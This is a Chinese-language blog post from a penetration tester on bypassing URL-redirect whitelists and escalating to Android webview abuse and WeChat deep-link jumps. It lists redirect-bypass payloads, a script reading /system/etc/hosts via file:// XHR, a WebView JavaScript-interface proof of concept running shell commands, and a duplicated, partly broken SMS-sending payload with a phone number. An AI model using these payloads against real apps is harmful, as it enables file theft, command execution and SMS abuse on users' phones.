---
layout: post
title:  URL跳转到webview安全
date: 2018-12-4 00:25:6.000000000 +08:00
---
# 起因
在一次测试中我用burpsuite搜索了关键词url找到了某处url
我测试了一下发现waf拦截了指向外域的请求，那么开始尝试绕过。所以有了这次的文章

# 经过
第一个我测试的url是`https://mall.m.xxxxxxx.com/jump.html?url=https://baidu.com`我打开成功跳转以为跳转成功，**but baidu.com是在白名单的**所以我就只能想办法去绕过他那么我经过了几次绕过之后发现`https://mall.m.xxxxxxx.com/jump.html?url=https:/\c1h2e1.github.io`跳转成功，这是我觉得有必要总结一下url的跳转绕过思路了，那么开始吧！！

# 正文

+	@  绕过
这个是利用了我们浏览器的特性，现在除了Firefox浏览器大部分都可以完成这样跳转下面是跳转的动态图
![aite_redirect]({{ "/assets/images/url/1.gif"|redirect}})

+	问号绕过
可以使用Referer的比如`https://baidu.com` 可以`https://任意地址/?baidu.com`

+	锚点 绕过
利用#会被浏览器解释成HTML中的锚点 `http://127.0.0.1/#qq.com` 

+	xip.io绕过
`http://www.baidu.com.127.0.0.1.xip.io/` 这样之后会访问127.0.0.1

```xip
How does it work?
xip.io runs a custom DNS server on the public Internet.
When your computer looks up a xip.io domain, the xip.io
DNS server extracts the IP address from the domain and
sends it back in the response.
```
![xip]({{ "/assets/images/url/1.png"|xip}})
在公网上运行自定义的dns服务器，用他的服务器提取IP地址，在响应中将他取回

+	反斜杠绕过
我这次测试中也是使用了这种思路
`https://mall.m.xxxxxxx.com/jump.html?url=https:/\c1h2e1.github.io`

+	IP绕过

把目标的URL修改成IP地址，这样也有可能绕过waf的拦截

+	chrome浏览器特性
```
http:/\/baidu.com
http:\//baidu.com
/\/baidu.com
http:\\\//baidu.com
```
这样的都会跳转到百度

#	url跳转到webview安全问题
我们这次的漏洞我在手机上测试的时候发现他会跳转伪协议
也就是`xxxx://app/webview?url=xxxxxxx`
其实这里的任意webview跳转已经构成漏洞了但是我想更加深入一下
看到webview我想到了利用file协议读取用戶的敏感信息那么下面的两篇文章可以补一下基础
[使用app内置webview 打开TextView中的超链接](https://www.jianshu.com/p/2c6c55b48238)

[乌云案例](http://www.anquan.us/static/bugs/wooyun-2015-0114241.html)
我们先用file://协议读取一下测试文件试一下
![host]({{ "/assets/images/url/2.png"|host}})
我们可以看到成功读取了手机的敏感host文件，但不是只要读取成功就能完成利用的，我们还需要设计到发送并读取
这边我又测试了一下JavaScript的情况，发现开启
那么我们在vps上搭建一下利用代码

```html
<html>
<head>
<title>test</title>
</head>
<script>
var xmlHttp;				//定义XMLHttpRequest对象
function createXmlHttpRequestObject(){
	//如果在internet Explorer下运行
	if(window.ActiveXObject){
		try{
			xmlHttp=new ActiveXObject("Microsoft.XMLHTTP");
		}catch(e){
			xmlHttp=false;
		}
	}else{
	//如果在Mozilla或其他的浏览器下运行
		try{
			xmlHttp=new XMLHttpRequest();
		}catch(e){
			xmlHttp=false;
		}
	}
	 //返回创建的对象或显示错误信息
	if(!xmlHttp)
		alert("error");
		else
		return xmlHttp;
}
function ReqHtml(){
	createXmlHttpRequestObject();
	path='file://'
	path1='/system/etc/hosts'
	xmlHttp.onreadystatechange=StatHandler;	//判断URL调用的状态值并处理
	xmlHttp.open("GET",path+path1,false);	//调用test.txt
	xmlHttp.send(null)
	alert(1)
}
function StatHandler(){
	if(xmlHttp.readyState==4 && xmlHttp.status==200){
		document.getElementById("webpage").innerHTML=xmlHttp.responseText;
		alert(xmlHttp.responseText)
	}
}
ReqHtml()
StatHandler()
</script>
<body>
<div id="webpage"></div>
</body>
</html>
```
在app上测试一下发现不成功。。。。
之后才得知是因为同源策略导致的，在网上各种找方法绕过后无果，没办法之好放弃。
虽然这个应用绕不过我们可以mark一点姿势
ps:很多代码都是手码的没写过JS所以可能会有一些错误不要见怪
```html
<html>
   <body>
      <script>
         function execute(cmdArgs)
         {
             return injectedObj.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
         }

         var res = execute(["/system/bin/sh", "-c", "ls -al /mnt/sdcard/"]);
         document.write(getContents(res.getInputStream()));
       </script>
   </body>
</html>
```
这个是执行命令的poc
```html
<html>
<head>
<title>Test send</title>
<script type="text/javascript">
function execute() {
	var sendsms = jsInterface.getClass().forName("android.telephony.SmsManager").getMethod("getDefault",null),invoke(null,null);
	sendsms.sendTextMessage("13722555165",null,"get",null,null);
}
</script>
</head>
<body onload="execute()">
<input type="button" onclick="="execute" value="test"/>

</body>
</html>
```
```html
<html>
<head>
<title>Test sendsms</title>
<script type="text/javascript">
function execute() {
	var sendsms = jsInterface.getClass().forName("android.telephony.SmsManager").getMethod("getDefault",null),invoke(null,null);
	sendsms.sendTextMessage("13722555165",null,"get",null,null);
}
</script>
</head>
<body onload="execute()">
<input type="button" onclick="="execute" value="test"/>

</body>
</html>
```

# 突然换目标
这是我想到了weixin的协议
`weixin://`看了官方的文档之后我发现了微信支持如下操作 
```weixin
weixin://dl/general
weixin://dl/favorites 收藏
weixin://dl/scan 扫一扫
weixin://dl/feedback 反馈
weixin://dl/moments 朋友圈
weixin://dl/settings 设置
weixin://dl/notifications 消息通知设置
weixin://dl/chat 聊天设置
weixin://dl/general 通用设置
weixin://dl/officialaccounts 公众号
weixin://dl/games 游戏
weixin://dl/help 帮助
weixin://dl/feedback 反馈
weixin://dl/profile 个人信息
weixin://dl/features 功能插件
```
那。。。我平时打开小xx网站的时候突然弹出的微信是什么鬼
经过一番查找我找到了能够跳转的方法
`weixin://dl/business/?ticket=xxxxxxxxxxxxxxxxx`
那么这个ticket哪里来呢？？？
我在t00ls上看到一篇同样关于这个微信协议的分析他说是有人在卖api我百度了一下找到了这个地址
![seoniao]({{ "/assets/images/url/3.png"|seoniao}})
我们注册并登陆尝试一下跳转
![seoniao]({{ "/assets/images/url/4.png"|seoniao}})
果然还是收费，因为写文章的时候比较早他们可能没有上班所以就换个地方找一下
![redirect]({{ "/assets/images/url/5.png"|redirect}})
我们加一下这个客服的qq
![screenshot]({{ "/assets/images/url/5.png"|screenshot}})
果然是我想象得那样
`
weixin://dl/business/?ticket=taa597ccdcdf00ecb865d9e04904bbff4
`
我们手机打开一下我得测试网页
`<a href="weixin://dl/business/?ticket=taa597ccdcdf00ecb865d9e04904bbff4">demo</a>`
成功打开微信并跳转~~~~

# 反思
在一次普通的漏洞利用中利用姿势绝不会普通，不断积累自己。 
